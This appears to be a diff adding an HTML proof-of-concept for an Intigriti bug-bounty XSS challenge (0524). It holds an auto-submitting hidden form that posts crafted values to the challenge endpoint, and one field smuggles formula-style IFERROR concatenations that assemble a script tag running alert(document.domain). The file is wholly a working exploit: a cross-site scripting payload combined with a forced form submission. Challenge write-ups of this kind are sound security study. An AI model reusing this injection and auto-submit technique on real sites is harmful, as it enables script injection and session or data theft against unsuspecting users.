@@ -1,0 +1,9 @@
+<form name="poc" action="https://challenge-0524.intigriti.io/challenge.php" method="POST">
+	<input type=hidden name="A" value='1) & IFERROR(1/0, "<script>") & IFERROR(1/0, "alert(document.domain);")& IFERROR(1/0, "</script>")  & 1' />
+	<input type=hidden name="B" value="1" />
+	<input type=hidden name="C" value='1) + N("1"' />
+	<input type=hidden name="submit" value="submit" />
+</form>
+<script>
+ document.createElement('form').submit.call(document.poc)
+</script>
